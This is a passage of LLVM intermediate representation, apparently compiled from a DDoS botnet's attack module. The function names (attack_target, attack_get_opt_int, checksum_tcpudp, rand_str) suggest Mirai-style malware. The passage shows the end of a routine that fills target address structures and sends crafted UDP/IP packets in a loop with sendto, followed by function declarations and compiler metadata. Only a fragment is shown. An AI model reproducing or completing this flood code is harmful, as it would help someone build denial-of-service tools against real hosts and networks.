  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 2
  %450 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %449, i32 0, i32 1
  %451 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %450, i32 0, i32 0
  store i32 %444, i32* %451, align 8
  %452 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %453 = load i32, i32* %9, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %452, i64 %454
  %456 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %455, i32 0, i32 2
  %457 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %456, i32 0, i32 0
  store i64 0, i64* %457, align 8
  %458 = load i32, i32* %10, align 4
  %459 = load i8*, i8** %30, align 8
  %460 = load i32, i32* %18, align 4
  %461 = sext i32 %460 to i64
  %462 = add i64 184, %461
  %463 = trunc i64 %462 to i32
  %464 = load i32, i32* @MSG_NOSIGNAL, align 4
  %465 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %466 = load i32, i32* %9, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %465, i64 %467
  %469 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %468, i32 0, i32 2
  %470 = bitcast %struct.TYPE_4__* %469 to %struct.sockaddr*
  %471 = call i32 @sendto(i32 %458, i8* %459, i32 %463, i32 %464, %struct.sockaddr* %470, i32 4)
  br label %472

472:                                              ; preds = %406
  %473 = load i32, i32* %9, align 4
  %474 = add nsw i32 %473, 1
  store i32 %474, i32* %9, align 4
  br label %267

475:                                              ; preds = %267
  br label %263

476:                                              ; preds = %99, %106, %263
  ret void
}

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i8* @attack_get_opt_int(i32, %struct.attack_option*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @rand_next(...) #1

declare dso_local i32 @htonl(i64) #1

declare dso_local i64 @ntohl(i32) #1

declare dso_local i32 @util_memcpy(i64, i8*, i32) #1

declare dso_local i32 @rand_str(i8*, i32) #1

declare dso_local i8* @checksum_generic(i32*, i32) #1

declare dso_local i64 @checksum_tcpudp(%struct.iphdr*, %struct.udphdr*, i8*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
